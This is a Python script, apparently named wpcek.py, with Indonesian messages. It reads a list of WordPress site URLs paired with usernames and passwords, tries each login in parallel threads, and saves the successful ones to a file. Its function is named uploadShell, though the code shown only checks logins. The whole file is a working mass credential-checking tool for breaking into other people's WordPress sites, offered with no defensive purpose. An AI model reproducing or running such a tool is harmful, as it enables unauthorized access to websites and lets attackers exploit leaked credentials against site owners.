import sys
import requests
from multiprocessing.dummy import Pool as ThreadPool

G = '\033[0;32m'
W = '\033[0;37m'
R = '\033[0;31m'
C = '\033[1;36m'

def uploadShell(site):
    asuna = site.replace('#', '|').replace('@', '|')
    try:
        site = asuna.split('|')[0]
        user = asuna.split('|')[1]
        pasw = asuna.split('|')[2]
        hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.101 Safari/537.36'}
        r = requests.Session()
        cek = r.get(site, timeout=10)
        if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
            login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
            if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
                print(' {}[{}+{}] {} --> {}Login Success!{}'.format(W, G, W, asuna, G, W))
                with open('loginSuccess.txt', 'a') as saveLog:
                    saveLog.write(site + '#' + user + '@' + pasw + '\n')
            else:
                print(' {}[{}-{}] {} --> {}Login Failed!{}'.format(W, R, W, asuna, R, W))
        else:
            print(' {}[{}-{}] {} --> {}Invalid Site!{}'.format(W, R, W, asuna, R, W))
    except Exception as e:
        print('\n {}[{}-{}] {} --> {}Failed!{} ({})\n'.format(W, R, W, site, R, W, e))

def main(filename, thread_count):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            sites = file.read().splitlines()
        pool = ThreadPool(thread_count)
        pool.map(uploadShell, sites)
        pool.close()
        pool.join()
    except FileNotFoundError:
        print(f'File {filename} tidak ditemukan.')
    except ValueError:
        print('Masukkan jumlah thread yang valid.')
    except Exception as e:
        print(f'Terjadi kesalahan: {e}')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python wpcek.py <filename> <thread_count>")
    else:
        filename = sys.argv[1]
        thread_count = int(sys.argv[2])
        print(f"Running wpcek.py with file: {filename} and threads: {thread_count}")
        main(filename, thread_count)
